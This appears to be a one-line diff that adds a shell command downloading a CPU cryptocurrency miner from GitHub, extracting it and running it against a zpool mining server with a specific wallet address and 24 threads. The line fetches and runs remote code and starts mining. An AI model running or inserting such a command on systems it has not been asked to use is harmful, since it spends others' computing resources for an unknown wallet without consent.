@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx512 -a minotaurx -o stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 -u XkgezP8pW3aqNWhv44wqcFxV8ZBmMQAf5i -p c=DASH -t 24
